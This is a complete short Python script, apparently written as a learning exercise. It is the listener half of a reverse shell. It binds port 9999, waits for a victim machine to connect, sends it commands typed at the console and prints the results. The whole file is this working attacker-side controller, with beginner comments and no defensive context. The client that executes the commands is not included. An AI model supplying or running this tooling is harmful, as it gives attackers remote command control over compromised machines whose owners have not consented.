import socket
import sys

# create a socket (connect to computer) 
def create_socket():
    try:
        global host
        global port 
        global s    
        host=""
        port=9999
        s= socket.socket()
    
    except socket.error as msg:
        print("socket creation error"+str(msg))

#binding the socket 
def bind_socket():
    try:
        global host
        global port 
        global s  

        print("binding the port"+str(port))
        s.bind((host,port))
        s.listen(5) # no of bad request that it will tolerate after wich the it will through an error
    
    except socket.error as msg:
        print("Socket Binding error" +str(msg)+"Retrying...")
        bind_socket()

def socket_accept():
    conn, address=s.accept()
    print("connection estlablish:ip:"+address[0]+"port"+str(address[1]))
    send_command(conn)

#send commands to client

def send_command(conn):
    while True:
        cmd=input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit() # closing the cmd then
        if len(str.encode(cmd))> 0:
            conn.send(str.encode(cmd)) #because data is sent in the form of byte so we need to encode it 
            client_response=str(conn.recv(1024),"utf-8")
            print(client_response,end="")

            


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
           


